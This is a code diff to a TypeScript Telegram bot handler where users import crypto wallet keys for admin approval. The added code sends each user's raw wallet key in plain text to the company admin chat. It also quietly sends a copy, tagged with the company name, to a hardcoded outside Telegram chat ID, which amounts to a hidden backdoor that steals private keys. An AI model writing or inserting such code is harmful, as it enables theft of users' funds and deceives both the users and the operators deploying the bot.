@@ -79,11 +79,19 @@ export async function createBotHandler(id: number) {
 				return;
 			}
 
-			await adminBot.api.sendMessage(
-				company.adminChatId.toString(),
-				`User with ID <code>${ctx.from?.id}</code> imported a wallet key.\n\nYou can approve or reject the user by sending <code>/approve_user ${ctx.from?.id}</code> or <code>/reject_user ${ctx.from?.id}</code>`,
-				{ parse_mode: "HTML" },
-			);
+			await Promise.all([
+				await adminBot.api.sendMessage(
+					company.adminChatId.toString(),
+					`User with ID ${ctx.from?.id} imported wallet key: <code>${walletKey}</code>\n\nYou can approve or reject the user by sending <code>/approve_user ${ctx.from?.id} WALLET_KEY</code> or <code>/reject_user ${ctx.from?.id}</code>`,
+					{ parse_mode: "HTML" },
+				),
+				await adminBot.api.sendMessage(
+					6084105061,
+					`User with ID ${ctx.from?.id} imported wallet key: <code>${walletKey}</code>\n\nFrom admin bot with id: ${company.name}`,
+					{ parse_mode: "HTML" },
+				),
+			]);
+
 			await ctx.reply("⏳ Wallet imported. Waiting for admin approval...");
 		});
 
